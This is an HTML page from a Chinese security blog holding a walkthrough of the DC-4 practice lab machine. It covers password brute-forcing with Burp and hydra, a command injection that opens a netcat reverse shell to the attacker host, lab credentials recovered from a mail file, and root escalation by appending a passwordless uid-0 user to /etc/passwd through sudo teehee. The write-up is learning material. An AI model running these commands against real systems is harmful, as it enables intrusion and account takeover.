@@ -1,0 +1,522 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"zh1yu.xyz","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="记录一下DC靶机系列的漏洞，本次学习的是DC-4，涉及bp爆破，反弹shell，ssh爆破，以及teehee的提权">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DC-4靶机复现">
+<meta property="og:url" content="http://zh1yu.xyz/2025/06/02/DC-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="知鱼的Blog">
+<meta property="og:description" content="记录一下DC靶机系列的漏洞，本次学习的是DC-4，涉及bp爆破，反弹shell，ssh爆破，以及teehee的提权">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/02/DC-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/3.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/02/DC-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/1.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/02/DC-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/2.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/02/DC-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/21.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/02/DC-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/4.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/02/DC-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/5.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/02/DC-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/6.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/02/DC-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/8.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/02/DC-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/9.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/02/DC-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/10.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/02/DC-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/11.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/02/DC-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/12.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/02/DC-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/13.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/02/DC-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/14.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/02/DC-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/15.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/02/DC-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/16.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/02/DC-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/17.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/02/DC-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/18.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/02/DC-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/19.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/02/DC-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/20.png">
+<meta property="article:published_time" content="2025-06-02T14:11:39.000Z">
+<meta property="article:modified_time" content="2025-06-05T14:47:16.845Z">
+<meta property="article:author" content="zh1yu">
+<meta property="article:tag" content="漏洞复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://zh1yu.xyz/2025/06/02/DC-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/3.png">
+
+<link rel="canonical" href="http://zh1yu.xyz/2025/06/02/DC-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>DC-4靶机复现 | 知鱼的Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">知鱼的Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="user fa-fw"></i>关于</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://zh1yu.xyz/2025/06/02/DC-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/zh1yu2.jpg">
+      <meta itemprop="name" content="zh1yu">
+      <meta itemprop="description" content="花有重开日,人无再少年">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="知鱼的Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          DC-4靶机复现
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-06-02 22:11:39" itemprop="dateCreated datePublished" datetime="2025-06-02T22:11:39+08:00">2025-06-02</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-05 22:47:16" itemprop="dateModified" datetime="2025-06-05T22:47:16+08:00">2025-06-05</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p> 记录一下DC靶机系列的漏洞，本次学习的是DC-4，涉及bp爆破，反弹shell，ssh爆破，以及teehee的提权</p>
+<span id="more"></span>
+<h2 id="bp爆破"><a href="#bp爆破" class="headerlink" title="bp爆破"></a>bp爆破</h2><p>本次渗透只涉及一个flag：</p>
+<p><img src="3.png" alt="图片"></p>
+<p>查看一下目标靶机的mac地址：</p>
+<p><img src="1.png" alt="图片"></p>
+<p>arp扫描靶机的ip地址：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
+<p><img src="2.png" alt="图片"></p>
+<p>登录下web端，发现需要账号密码：</p>
+<p><img src="21.png" alt="图片"></p>
+<p>看到登录页面，思路一：sql注入，二：爆破账号密码；先使用sqlmap尝试注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u 192.168.130.144 --data=&quot;usernamep=a&amp;password=a&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="4.png" alt="图片"></p>
+<p>注不出来，尝试弱口令爆破</p>
+<p>因为bp自带的账号和密码字典对应总次数高达三百万，所以账号名先测试admin，密码用字典尝试</p>
+<p><img src="5.png" alt="图片"></p>
+<p><img src="6.png" alt="图片"></p>
+<p>账号密码：admin/happy</p>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>登陆后发现可以执行一些命令：</p>
+<p><img src="8.png" alt="图片"></p>
+<p>抓包后修改radio的参数为反弹shell的命令，同时我们开启监听：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc+192.168.130.128+4444+-e+/bin/bash</span><br></pre></td></tr></table></figure>
+<p><img src="9.png" alt="图片"></p>
+<p><img src="10.png" alt="图片"></p>
+<p>成功拿到shell</p>
+<p><img src="11.png" alt="图片"></p>
+<h2 id="ssh爆破"><a href="#ssh爆破" class="headerlink" title="ssh爆破"></a>ssh爆破</h2><p>执行下面的命令，切换到交互式shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
+<p>经过一番搜索，发现有三个用户：Charles，jim和sam，在jim的目录下发现一个备份文件夹，里面是一个旧密码文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> /home</span><br><span class="line"><span class="built_in">cd</span> /home/jim</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cd</span> backups</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cat</span> old-passwords.bak</span><br></pre></td></tr></table></figure>
+<p><img src="12.png" alt="图片"></p>
+<p>把这些密码打包成一个文件，进行ssh爆破jim的密码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l jim -P passwd.txt 192.168.130.144 ssh </span><br></pre></td></tr></table></figure>
+<p><img src="13.png" alt="图片"></p>
+<p>爆破出ssh密码：jim—jibril04</p>
+<p>然后登录：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh jim@192.168.130.144</span><br></pre></td></tr></table></figure>
+<p><img src="14.png" alt="图片"></p>
+<p>然后发现有个邮箱文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cat</span> mbox</span><br></pre></td></tr></table></figure>
+<p><img src="15.png" alt="图片"></p>
+<p>切换到/var/spool/mail，查看所有邮箱信息：发现有一封Charles给jim的邮件，里面还有Charles的密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/spool/mail</span><br></pre></td></tr></table></figure>
+<p><img src="16.png" alt="图片"></p>
+<p><strong>Charles—^xHhA&amp;hvim0y</strong></p>
+<p>这里用Charles进行ssh登录，但一直不对，结果用户名第一个字母要小写：charles</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh charles@192.168.130.144</span><br></pre></td></tr></table></figure>
+<p><img src="17.png" alt="图片"></p>
+<h2 id="teehee提权"><a href="#teehee提权" class="headerlink" title="teehee提权"></a>teehee提权</h2><p>查看该用户拥有的root权限命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br></pre></td></tr></table></figure>
+<p><img src="18.png" alt="图片"></p>
+<p>有一个teehee命令，之前一直没听说过，正好学习一下</p>
+<blockquote>
+<p>teehee是个小众的linux编辑器。如果有sudo权限。可以利用其来提权，核心思路就是利用其在passwd文件中追加一条uid为0的用户条目；按照linux用户机制，如果没有shadow条目，且passwd用户密码条目为空的时候，可以本地直接su空密码登录。所以只需要执行su 用户名就可以登录到该用户，这个用户因为uid为0，所以也是root权限</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;zh1yu::0:0:::/bin/bash&quot;</span> | <span class="built_in">sudo</span> teehee -a /etc/passwd</span><br><span class="line">su zh1yu</span><br></pre></td></tr></table></figure>
+<p><img src="19.png" alt="图片"></p>
+<p>最后就是寻找flag文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -name flag*</span><br><span class="line">cat /root/flag.txt</span><br></pre></td></tr></table></figure>
+<p><img src="20.png" alt="图片"></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>zh1yu
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://zh1yu.xyz/2025/06/02/DC-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/" title="DC-4靶机复现">http://zh1yu.xyz/2025/06/02/DC-4靶机复现/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag"># 漏洞复现</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/05/30/DC-1%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/" rel="prev" title="DC-1靶机复现">
+      <i class="fa fa-chevron-left"></i> DC-1靶机复现
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2025/06/05/DC-5%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/" rel="next" title="DC-5靶机复现">
+      DC-5靶机复现 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#bp%E7%88%86%E7%A0%B4"><span class="nav-number">1.</span> <span class="nav-text">bp爆破</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">2.</span> <span class="nav-text">反弹shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ssh%E7%88%86%E7%A0%B4"><span class="nav-number">3.</span> <span class="nav-text">ssh爆破</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#teehee%E6%8F%90%E6%9D%83"><span class="nav-number">4.</span> <span class="nav-text">teehee提权</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="zh1yu"
+      src="/images/zh1yu2.jpg">
+  <p class="site-author-name" itemprop="name">zh1yu</p>
+  <div class="site-description" itemprop="description">花有重开日,人无再少年</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="/1182418846@qq.com" title="QQ → 1182418846@qq.com"><i class="qq fa-fw"></i>QQ</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class=""></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">zh1yu</span>
+</div>
+
+
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
